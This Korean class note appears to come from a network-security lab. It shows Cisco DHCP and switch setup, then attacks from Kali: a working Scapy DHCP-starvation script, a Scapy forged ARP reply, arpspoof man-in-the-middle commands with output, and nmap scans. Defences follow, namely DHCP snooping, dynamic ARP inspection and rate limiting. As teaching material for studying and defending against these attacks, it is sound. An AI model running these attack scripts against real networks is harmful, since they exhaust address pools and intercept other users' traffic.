## 복습

라우터에서 DHCP pool 생성 <br/>
이름 : DHCP<br/>
네트워크 범위 : 30.1.1.0/24<br/>
게이트웨이 :30.1.1.254<br/>
dns : 8.8.8.8<br/>
제외범위 : 30.1.1.0 30.1.1.100<br/>
<br/>
<br/>
conf t 모드로 시작<br/>
ip dhcp pool DHCP<br/>
network 30.1.1.0/24<br/>
default-router 30.1.1.254<br/>
dns-server 8.8.8.8<br/>
exit<br/>
<br/>
ip dhcp excluded-address 30.1.1.0 30.1.1.100<br/>
<br/>
확인<br/>
ip dhcp pool<br/>

### 공격 (scapy , yersina)

거짓 dhcp 풀을 만들어서 상대방의 게이트웨이나 dns 주소를 속이는 공격 ← MITM 공격 진행 <br/>
scapy, yersinia 를 활용한 dhcp 풀 고갈 공격 진행<br/>
<br/>

### 공격-2 (arp spoofing) 

 arpspoof 도구를 명령어 형태 실행<br/>
   arpspoof -i eth0 -r -t 30.1.1.102 30.1.1.254<br/><br/>
 ettercap - GUI 도구 실행<br/>
  시작 - ettercap → target1, target2 지정 후 → 공격 실행<br/><br/>
scapy를 활용한 실행<br/>
  python3 spoofer.py <br/><br/>

### 방어(보안설정)

switch에서<br/>
snooping 설정으로 trust 포트 지정을 통해 진짜 dhcp pool 을 통해서만 ip 할당을 받게 된다.<br/>
dhcp-rate-limit 설정을 통해, DOS 공격시 자동으로 포트를 다운 시킨다. 가용성을 높이기 위해 errdisable recovery을 추가 설정<br/>
상기의 테이블 정보를 통해 학습된 mac 주소 이외의 정보가 들어오면 차단 시킨다. → DAI 설정을 이어지게 됨<br/>

### 방어(보안)-2
#### 각 호스트에서 arp table을 static(수동)으로 고정
우분투에서 맥주소 고정<br/>
root@Toolbox-1:~# arp -s 30.1.1.254 0c:37:84:2d:00:01<br/>
root@Toolbox-1:~# arp -d 30.1.1.254   ← 정리<br/>

#### 라우터에서 맥주소 고정
Router#sh ip arp | s 30.1.1.5<br/>
Router(config)#arp 30.1.1.5 9 ec2.6727.8a10 ARPA<br/>
Router(config)#do sh arp | s 30.1.1.5  <br/>
Router(config)#NO arp 30.1.1.5 9ec2.6727.8a10 ARPA  ← 정리<br/>

#### Dynamic ARP Inspection → DAI 
스위치에서 APR 관련 패킷을 모니터링하고 정상적인 패킷은 허용(trust) 하고, 비정상적인 패킷은 차단(untrust)하는 보안 설정이다. <br/>
정상적인 dhcp 서버방향 포트를 trust포트로 지정하였던것 처럼, DAI 에서도 동일하게 신뢰할 수 있는 포트를 trust 포트로 지정을 하고, 나머지 다른 포트는 자동으로 untrust 포트로 지정이 된다.<br/>
<br/>

확인 sh ip dhcp snooping binding <br/>
<br/>
snooping에  이어서 DAI 설정을 아래 와 같이 해보자.<br/>
SW1(config)#int g0/1<br/>
SW1(config-if)#ip arp inspection trust   ← 라우터(게이트웨이)방향에 지정<br/>
SW1(config)#ip arp inspection vlan 1  ← 활성화<br/>
신뢰할 수 있는 호스트간에는 정상적으로 동작이 된다.<br/>
ping 30.1.1.101 / ping 30.1.1.254 등이 정상적으로 동작<br/>
		<br/>
SW1(config)#no ip arp inspection vlan 1  ← arp inspection 종료<br/>
SW1(config)#int g0/1<br/>
SW1(config-if)#no ip arp inspection trust<br/>
<br/>

비정상적인 동작을 확인하기 위해서 arp 패킷을 하나 생성해보자.<br/>
<br/>
칼리에서 수동으로 설정한 IP(30.1.1.9)에서 출발한 ARP 패킷은 신뢰DB에 소속되어 있지 않기 때문에, 아래와 같은 코드를 실행할 경우 → DAI에 의해서 차단 된다.<br/>
<br/>
┌──(root㉿kali)-[~]<br/>
└─# nano arp_packet.py       <br/>    
                             <br/>                                                                                             
┌──(root㉿kali)-[~]<br/>
└─# python3 arp_packet.py<br/>
.<br/>
Sent 1 packets.<br/>
<br/>
from scapy.all import *<br/>
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="30.1.1.254", hwsrc="aa:bb:cc:dd:ee:ff")<br/>
sendp(packet, iface="eth0")<br/>
<br/>
스위치에 아래와 같이 arp 패킷의 차단을 확인할 수 있다.<br/>

<img width="617" height="79" alt="Image" src="https://github.com/user-attachments/assets/e76af76a-ab59-4606-903e-3f3394e6457a" />

untrust 포트에서 arp 속도 제한<br/>
SW1(config)#int g0/3 <br/>
SW1(config-if)#ip arp inspection limit rate 10<br/>
SW1(config)#errdisable recovery cause arp-inspection  ← 자동 복구 옵션션<br/>
SW1(config)#errdisable recovery interval 30<br/>
<br/>
정상적인 고정 IP 를 사용하는 정상적인(웹,FTP등) 서버 등의 차단을 막기 위해서 예외적으로 허용<br/>
ACL 설정을 DAI 에 추가 적용시켜준다. ACL에는 DAI 에서 제외될 목록을 지정해준다.<br/>
<br/>
ex) access-list 1 permit any ← NAT 설정시 모든 출발지의 IP 주소를 허용해주겠다.<br/>
<br/>
SW1(config)#arp access-list STATIC_SERVER<br/>
SW1(config-arp-nacl)#permit ip host 30.1.1.9 mac host 00:0c:29:9b:de:a7 ← 허용할 목록 생성<br/>
SW1(config-arp-nacl)#exit<br/>
SW1(config)#ip arp inspection filter STATIC_SERVER vlan 1  ← 그 목록 적용<br/>
SW1(config)#ip arp inspection vlan 1 ← DAI 실행<br/>
<br/>
(정상적인 서버로 등록한) 칼리에서 ping 테스트로 허용되는 것을 확인한다.<br/>







#### 조회

Router#sh ip dhcp binding   /  Router#sh ip dhcp pool<br/>
SW1#sh ip dhcp snooping binding<br/>

## 공격

### Kali (scapy)

파일명: dhcp_str.py<br/>
<br/>
from scapy.all import *<br/>
#DHCP Starvation 공격 함수<br/>
def dhcp_starvation(iface="eth0", count=100):<br/>
    for _ in range(count):<br/>
        mac = RandMAC()  # 랜덤 MAC 주소 생성<br/>
        pkt = (<br/>
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")   <br/>
            / IP(src="0.0.0.0", dst="255.255.255.255") <br/>
            / UDP(sport=68, dport=67) <br/>
            / BOOTP(chaddr=mac2str(mac), xid=RandInt())      	<br/>
            / DHCP(options=[("message-type", "discover"), "end"]) <br/>
        )<br/>
        sendp(pkt, iface=iface, verbose=0)  # 패킷 전송 (L2 계층)<br/>
        print(f"[+] Sent DHCP Discover from {mac}")<br/>
<br/>
dhcp_starvation()<br/>
<br/>
python3 dhcp_str.py 실행<br/>
<br/>

### Kali (yersinia)

yersinia 실행<br/>
yersinia -I<br/>

https://github.com/Niseria/network-class/blob/main/20251016(yersinia).md

### Kali (spoofing)

칼리에서 IP Forwarding 기능 활성화: 왜냐하면 호스트에는 라우팅 기능없기 때문에 아래 설정을 통해서 받은 패킷을 목적지에 맞게 전달<br/>
<br/>
┌──(root㉿kali)-[/proc/sys/net/ipv4]<br/>
└─# cat ip_forward<br/>
0<br/>
                               <br/>                                                               
┌──(root㉿kali)-[/proc/sys/net/ipv4]<br/>
└─# echo 1 > ip_forward<br/>
                                   <br/>                                                           
┌──(root㉿kali)-[/proc/sys/net/ipv4]<br/>
└─# cat ip_forward     <br/>
1<br/>
<br/>

┌──(root㉿kali)-[~]<br/>
└─# netdiscover -r 30.1.1.0/24 -P > netdiscover_result_2.txt<br/>
<br/>
단점: 클래스풀에 맞는 조건에서만 동작이 가능하다. /25, /19 등은 동작(탐지)이 안된다.<br/>
<br/>
┌──(root㉿kali)-[~]<br/>
└─# nmap -sn 30.1.1.0/24<br/>
<br/>
┌──(root㉿kali)-[~]<br/>
└─# nmap -F 30.1.1.5 30.1.1.254<br/>
<br/>
<br/>
arp spoofing으로 양쪽 장비의 arp table을 동시에 속여 준다.<br/>
                                                         <br/>                                     
┌──(root㉿kali)-[/proc/sys/net/ipv4]<br/>
└─# arpspoof -i eth0 -r -t 30.1.1.5 30.1.1.254 <- -r은 양쪽으로 보내는 옵션<br/>
0:c:29:9b:de:a7 d6:2d:28:72:87:39 0806 42: arp reply 30.1.1.254 is-at 0:c:29:9b:de:a7<br/>
0:c:29:9b:de:a7 c:37:84:2d:0:1 0806 42: arp reply 30.1.1.5 is-at 0:c:29:9b:de:a7<br/>
0:c:29:9b:de:a7 d6:2d:28:72:87:39 0806 42: arp reply 30.1.1.254 is-at 0:c:29:9b:de:a7<br/>
0:c:29:9b:de:a7 c:37:84:2d:0:1 0806 42: arp reply 30.1.1.5 is-at 0:c:29:9b:de:a7<br/>
<br/>

<img width="577" height="714" alt="Image" src="https://github.com/user-attachments/assets/85c69ed0-2db3-4239-8706-470979b4ea40" />


## 보안설정

SW1(config)#ip dhcp snooping  ← snooping 동작 선언<br/>
SW1(config)#ip dhcp snooping vlan 1<br/>
SW1(config)#no ip dhcp snooping information option<br/>
<br/>
SW1(config)#int g0/1<br/>
SW1(config-if)#ip dhcp snooping trust <br/>
<br/>
도커 장비를 켜서, dhcp 획득을 확인한 후,<br/>
<br/>
SW1#sh ip dhcp snooping binding  <br/>
<br/>
int range g0/0,g0/3,g1/0 //클라이언트 방향<br/>
ip dhcp snooping limit rate 10 //초당 패킷 수 10개로 제한<br/>
<br/>
SW1(config)#errdisable recovery cause dhcp-rate-limit<br/>
SW1(config)#errdisable recovery interval 30<br/>
<br/>
<br/>
<img width="812" height="497" alt="Image" src="https://github.com/user-attachments/assets/972ea7fe-803e-4310-83f1-2cf5a63ac68c" />










